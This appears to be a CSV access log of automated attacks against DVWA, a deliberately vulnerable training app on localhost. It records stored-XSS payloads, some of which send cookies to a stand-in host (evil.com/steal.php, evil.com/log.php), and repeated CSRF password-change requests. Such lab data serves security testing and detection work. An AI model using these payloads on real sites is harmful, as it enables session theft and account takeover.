_id,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
f432d0d55206,251753,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:41
b37a016d5c90,252073,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&mtxMessage=<form><button+formaction=javascript:alert('XSS')>Click</button></form>&btnSign=Sign+Guestbook&user_token=90d15ba4b200ea2fd2d8b16c7b305d76",200,2025-10-11T21:59:41
5023a43ef5a2,252073,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:42
3341019808f4,252357,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&mtxMessage=&#60;script&#62;alert('XSS')&#60;/script&#62;&btnSign=Sign+Guestbook&user_token=7c67017d5776b6883f0c97c5145c12b2",200,2025-10-11T21:59:42
9c41e9eba700,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_jhzte3&password_conf=hacked_j9LKck&Change=Change,302,2025-10-11T21:59:43
0d6b7dea0aae,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:43
9c41e9eba700,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_Awvmm1&password_conf=hacked_RX2wiX&Change=Change,302,2025-10-11T21:59:43
4fdc30a7bd7e,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:43
dc18d5fdd177,252357,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:43
670631816fab,252658,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&mtxMessage=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&btnSign=Sign+Guestbook&user_token=a41ebd2e8eaf96584052acf8371ad351",200,2025-10-11T21:59:43
dc18d5fdd177,252658,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:43
84d8db24ef16,252900,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>&mtxMessage=<svg+onload=alert('XSS')>&btnSign=Sign+Guestbook&user_token=9694553d38464d4b385e105fea044ab7,200,2025-10-11T21:59:44
8dc39bee94af,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_mZ2DPj&password_conf=hacked_b277XY&Change=Change,302,2025-10-11T21:59:44
2f53cc0dec13,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:44
8dc39bee94af,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:44
823930571e81,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_A5YjVH&password_conf=hacked_ChvkCO&Change=Change&user_token=6a3f8946e5531e2689e6e057aec2c61f,200,2025-10-11T21:59:44
841782f492c9,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_iaaygO&password_conf=hacked_amxcf8&Change=Change,302,2025-10-11T21:59:45
ab72558bfb3b,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:45
8615668c8282,252900,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:45
dc2b68b25f3c,253133,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<svg+onload=alert('XSS')>&mtxMessage=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&btnSign=Sign+Guestbook&user_token=8e30d87fef0e65ef88991353cf5ffb8b",200,2025-10-11T21:59:45
8615668c8282,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&mtxMessage=<svg+onload=alert('XSS')>&btnSign=Sign+Guestbook",302,2025-10-11T21:59:45
683e38dd6a68,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:45
841782f492c9,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:45
dc21ec96e519,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_2mXlbP&password_conf=hacked_mpzp7G&Change=Change&user_token=9898188da8e5b4c31677661e209fc7d4,200,2025-10-11T21:59:45
6688b887a0ef,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_bt4Pty&password_conf=hacked_aaaBM9&Change=Change,302,2025-10-11T21:59:46
2b6badb0e511,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:46
6688b887a0ef,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_e8cBs4&password_conf=hacked_FjXkix&Change=Change,302,2025-10-11T21:59:46
2b6badb0e511,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:46
6688b887a0ef,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T21:59:46
0469a6fb15d0,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:46
26fe418b9595,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_sJLqRE&password_conf=hacked_QiLULU&Change=Change&user_token=7211e90eed4fd9e36117c33c7bd6e36a,302,2025-10-11T21:59:46
0469a6fb15d0,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:46
6688b887a0ef,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_5spRwU&password_conf=hacked_LCKsf8&Change=Change,302,2025-10-11T21:59:46
2b6badb0e511,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:46
f83e5dfdd487,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:47
c46e530d5560,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_4mbrsY&password_conf=hacked_IukAhy&Change=Change&user_token=2bc47e8e9976d3dc1f5369f6335ac604,200,2025-10-11T21:59:47
127bd707b3e4,253133,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:47
2c4ab03b31ef,253372,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=%3Cscript%3Ealert('XSS')%3C/script%3E&mtxMessage=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&btnSign=Sign+Guestbook&user_token=ce26524203cfe037e02c54e10971ced8",200,2025-10-11T21:59:47
1ebb22689a1f,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&mtxMessage=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&btnSign=Sign+Guestbook",302,2025-10-11T21:59:48
ad39cbe146a9,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:48
43926691d960,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:48
214576b410b3,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_vtOuDI&password_conf=hacked_QqVfQF&Change=Change&user_token=b83405fc215f7c4a6df1c2c86fa527fc,200,2025-10-11T21:59:48
fb632895f3e1,253372,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=javascript:alert('XSS')&mtxMessage=<body+onload=alert('XSS')>&btnSign=Sign+Guestbook,200,2025-10-11T21:59:50
fb632895f3e1,253372,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&mtxMessage=%3Cscript%3Ealert('XSS')%3C/script%3E&btnSign=Sign+Guestbook",200,2025-10-11T21:59:50
e68b9dc24a9f,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=&#60;script&#62;alert('XSS')&#60;/script&#62;&mtxMessage=<svg+onload=alert('XSS')>&btnSign=Sign+Guestbook,302,2025-10-11T21:59:51
70016ee2f146,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:51
9ebb8312717e,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_ERn7ZM&password_conf=hacked_hc7vHW&Change=Change,302,2025-10-11T21:59:51
4a94b921a6b4,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:51
9ebb8312717e,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:51
c2be52cf9742,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_LsCSUj&password_conf=hacked_jvZzcj&Change=Change&user_token=066f7431652fd087f07d7999003e0b99,200,2025-10-11T21:59:51
9ebb8312717e,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:51
c2be52cf9742,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_aAjD0x&password_conf=hacked_fPb1XL&Change=Change&user_token=283d844ee4d1fd04edcb9b513b02da15,200,2025-10-11T21:59:51
349e87e11db4,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_9a2qTA&password_conf=hacked_ydGesH&Change=Change,302,2025-10-11T21:59:52
70156f119d87,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:52
e609e4e3dc71,253372,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<iframe+src='javascript:alert(document.cookie)'></iframe>&mtxMessage=<svg+onload=alert('XSS')>&btnSign=Sign+Guestbook,200,2025-10-11T21:59:52
e609e4e3dc71,253372,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&mtxMessage=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&btnSign=Sign+Guestbook",200,2025-10-11T21:59:52
349e87e11db4,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:52
fb5b836ff22a,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_goFx4A&password_conf=hacked_SK9dof&Change=Change&user_token=5981dcba7f8e60cebd1d42cad3f7d192,200,2025-10-11T21:59:52
52cf25019362,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_i2aXxm&password_conf=hacked_yYv76W&Change=Change,302,2025-10-11T21:59:53
1bab35e9e7f6,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:53
1a8fb82200eb,253372,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:53
bad1d1447dc5,253572,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<script>alert('XSS')</script>&mtxMessage=<body+onload=alert('XSS')>&btnSign=Sign+Guestbook&user_token=570b58a5301057c7a079effe6d403855,200,2025-10-11T21:59:53
52cf25019362,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:53
af040b19e148,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_jlcbIz&password_conf=hacked_Gpog8L&Change=Change&user_token=b2223100b118588ba9536a1f56641054,200,2025-10-11T21:59:54
b41135abe954,253572,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<img+src=x+onerror=alert('XSS')>&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook,200,2025-10-11T21:59:54
6e63338c8873,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_Qj8q1F&password_conf=hacked_9CjiRE&Change=Change,302,2025-10-11T21:59:54
cc7cd1a197bb,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:54
6e63338c8873,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:54
af040b19e148,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_mdR5p4&password_conf=hacked_RVFj1t&Change=Change&user_token=ea3d4c7c38492a1c8a5b0f074582c28e,200,2025-10-11T21:59:54
ca03705d9bfa,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_nIKbnH&password_conf=hacked_pPWQn2&Change=Change,302,2025-10-11T21:59:55
54f021fa8025,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:55
cb02321f99da,253572,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=javascript:alert('XSS')&mtxMessage=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>&btnSign=Sign+Guestbook,200,2025-10-11T21:59:55
ca03705d9bfa,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_7oGxN7&password_conf=hacked_AaToQQ&Change=Change,302,2025-10-11T21:59:55
844d551901e0,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:55
ca03705d9bfa,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:55
b37c2295b9bf,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_JtCDOa&password_conf=hacked_E93sUV&Change=Change&user_token=545a31432478b528a565294aac43604c,200,2025-10-11T21:59:55
1fcd06e9a09f,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_OjKgnl&password_conf=hacked_WMyK59&Change=Change,302,2025-10-11T21:59:56
f9e452d49a22,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:56
1fcd06e9a09f,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_qGXUux&password_conf=hacked_noNpX4&Change=Change,302,2025-10-11T21:59:56
f9e452d49a22,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:56
1bffaaac0239,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<body+onload=alert('XSS')>&mtxMessage=&lt;script&gt;alert('XSS')&lt;/script&gt;&btnSign=Sign+Guestbook,302,2025-10-11T21:59:56
ea9c00ba8682,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:56
1fcd06e9a09f,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_yo2W1X&password_conf=hacked_E35cIa&Change=Change,302,2025-10-11T21:59:56
f9e452d49a22,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:56
3f67cc4359d5,253572,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:57
868676f32b4c,253873,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&mtxMessage=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>&btnSign=Sign+Guestbook&user_token=85b712f83e65c6eeca65362bb845cc1b",200,2025-10-11T21:59:57
a74fafb843b4,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_FfMgEW&password_conf=hacked_gqodAK&Change=Change,302,2025-10-11T21:59:57
6bda347c6f75,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:57
a74fafb843b4,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T21:59:57
fb48900849d9,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:57
92bc468c9e41,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_BFxqDl&password_conf=hacked_9DdL7y&Change=Change&user_token=e2f65804b0db494adf820b5de1874b4c,302,2025-10-11T21:59:57
fb48900849d9,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:57
78fd047e2a52,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:59:58
873e0e3e3423,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_jUkNGW&password_conf=hacked_wVauE1&Change=Change&user_token=56ed00fba2be7009978ccc37793d7b89,200,2025-10-11T21:59:58
78fd047e2a52,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_haGo9k&password_conf=hacked_snQynB&Change=Change,302,2025-10-11T21:59:58
f36f2ba9ab40,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:59:58
9e2119cfd4cd,253873,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:58
f46b8b524f71,254089,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=javascript:alert('XSS')&mtxMessage=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&btnSign=Sign+Guestbook&user_token=02e51739385c0a7d6bee3742a4163153",200,2025-10-11T21:59:59
1aa1021333eb,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T21:59:59
ea49dd8b9937,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:59
0adc89d4eaaf,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_sm1m57&password_conf=hacked_lfFR5q&Change=Change&user_token=2dd732ec7996f36ababc0acfe8196cc1,302,2025-10-11T21:59:59
ea49dd8b9937,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:59:59
da6e1a1ec30b,254089,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&mtxMessage=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>&btnSign=Sign+Guestbook",200,2025-10-11T21:59:59
da6e1a1ec30b,254089,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:59:59
f46b8b524f71,254338,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=&lt;script&gt;alert('XSS')&lt;/script&gt;&mtxMessage=data:text/html,<script>alert('XSS')</script>&btnSign=Sign+Guestbook&user_token=31c00ee6c5b74c863c8b915325c8dcef",200,2025-10-11T21:59:59
2646b03de6e4,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_9cCJiZ&password_conf=hacked_cNAyMM&Change=Change,302,2025-10-11T22:00:00
2c915b7890dd,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:00
2646b03de6e4,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T22:00:00
589a51a5427c,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:00
0b21c2341a84,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_6Jlqac&password_conf=hacked_vUlbqc&Change=Change&user_token=6855d3a2080a894668480fb005e2c103,302,2025-10-11T22:00:00
589a51a5427c,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:00
2646b03de6e4,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_0NHvU0&password_conf=hacked_EEnRFC&Change=Change,302,2025-10-11T22:00:00
2c915b7890dd,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:00
807b55784f6b,254338,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<input+type='image'+src='x'+onerror='alert(String.fromCharCode(88,83,83))'>&mtxMessage=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&btnSign=Sign+Guestbook",200,2025-10-11T22:00:00
84065f646c7b,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:01
1e4192069570,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_MZyxdJ&password_conf=hacked_eGATnD&Change=Change&user_token=a350b521acbb473e80f9775ffbf96c24,200,2025-10-11T22:00:01
84065f646c7b,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_qZUbxe&password_conf=hacked_JPxuDu&Change=Change,302,2025-10-11T22:00:01
517e24b3a15e,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:01
a771d12cd99e,254338,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:01
2a3c0d16ad09,254597,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>&mtxMessage=<ScRiPt>alert('XSS')</ScRiPt>&btnSign=Sign+Guestbook&user_token=2cc59ef3920d9d5a4b310224036dd3cc",200,2025-10-11T22:00:01
a771d12cd99e,254597,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=data:text/html,<script>alert('XSS')</script>&mtxMessage=<ScRiPt>alert('XSS')</ScRiPt>&btnSign=Sign+Guestbook",200,2025-10-11T22:00:01
fbb2edb54797,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_sA7hOL&password_conf=hacked_92MtqS&Change=Change,302,2025-10-11T22:00:02
a9c23f821da3,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:02
a90b85538720,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&mtxMessage=<img+src=x+onerror=alert('XSS')>&btnSign=Sign+Guestbook",302,2025-10-11T22:00:02
b19a49156050,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:02
fbb2edb54797,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:02
67296542a281,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_eIYIl8&password_conf=hacked_gjmVtg&Change=Change&user_token=2ba103c11ba13eb9d78490ab495f4f8c,200,2025-10-11T22:00:02
a90b85538720,254597,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<body+onload=alert('XSS')>&mtxMessage=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&btnSign=Sign+Guestbook",200,2025-10-11T22:00:02
fbb2edb54797,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_OVlrWT&password_conf=hacked_IJPYSH&Change=Change,302,2025-10-11T22:00:02
a9c23f821da3,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:02
5a078a33bce5,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T22:00:03
0fb5e3844816,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:03
0a77d6bd54ea,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_g9kAHT&password_conf=hacked_h1qSSK&Change=Change&user_token=342011a179eaa13946a915f5c3543dd3,302,2025-10-11T22:00:03
0fb5e3844816,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:03
6a4662150235,254597,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<script>alert('XSS')</script>&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook,200,2025-10-11T22:00:03
6a4662150235,254597,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=data:text/html,<script>alert('XSS')</script>&mtxMessage=<img+src=x+onerror=alert('XSS')>&btnSign=Sign+Guestbook",200,2025-10-11T22:00:03
6a4662150235,254597,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=javascript:alert('XSS')&mtxMessage=<input+type='image'+src='x'+onerror='alert(String.fromCharCode(88,83,83))'>&btnSign=Sign+Guestbook",200,2025-10-11T22:00:03
c63464bda5fd,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>&mtxMessage=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&btnSign=Sign+Guestbook",302,2025-10-11T22:00:04
c68dfde5b0b6,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:04
435d796042ca,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:04
db3dba387ce7,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_JlCMQN&password_conf=hacked_RE2Gyq&Change=Change&user_token=ca22cbc2a53ed7e7f0536d83a6e34a92,200,2025-10-11T22:00:04
